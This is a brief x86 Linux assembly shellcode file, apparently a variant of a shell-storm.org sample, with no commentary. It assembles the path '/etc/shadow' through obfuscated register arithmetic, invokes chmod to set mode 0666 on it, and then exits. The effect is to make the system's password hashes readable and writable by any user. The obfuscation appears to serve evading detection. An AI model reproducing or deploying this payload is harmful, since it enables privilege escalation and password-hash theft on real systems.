; Original: http://shell-storm.org/shellcode/files/shellcode-210.php
; 

section .text

global _start

_start:
	xor edx, edx
	xor eax, eax
	add eax, 0xf

	mov ecx, edx
	push edx
	
	mov cl, 0x11
	add cl, 0x66
	push ecx
	add cx, 0x6eed
	push cx
	add ecx, 0x616803cb
	push ecx
	push 0x6374652f
	mov ebx, esp
	xor ecx, ecx
	mov cx, 0x1b6
	int 0x80
	push byte 1
	pop eax
	int 0x80
